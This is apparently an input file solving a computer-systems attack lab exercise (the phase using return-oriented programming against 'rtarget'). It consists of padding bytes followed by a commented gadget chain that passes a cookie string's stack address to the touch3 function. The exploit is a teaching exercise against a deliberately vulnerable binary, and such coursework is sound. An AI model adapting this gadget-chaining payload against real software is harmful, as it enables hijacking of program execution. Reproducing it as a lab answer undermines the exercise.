00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e0 19 40 00 00 00 00 00		//mov %rsp,%rax ret
14 19 40 00 00 00 00 00		//mov %rax, %rdi ret
e6 18 40 00 00 00 00 00		//popq %rax ret
48 00 00 00 00 00 00 00		//cookie字符串地址在栈中的偏移量
c0 19 40 00 00 00 00 00		//movl %eax,%edx ret
b8 19 40 00 00 00 00 00		//movl %edx,%ecx ret
25 19 40 00 00 00 00 00		//movl %ecx,%esi ret
1e 19 40 00 00 00 00 00		//lea (%rdi, %rsi, 1),%rax ret
14 19 40 00 00 00 00 00		//mov %rax, %rdi ret
53 18 40 00 00 00 00 00		//touch3起始地址
32 64 36 66 63 32 64 35		//cookie字符串
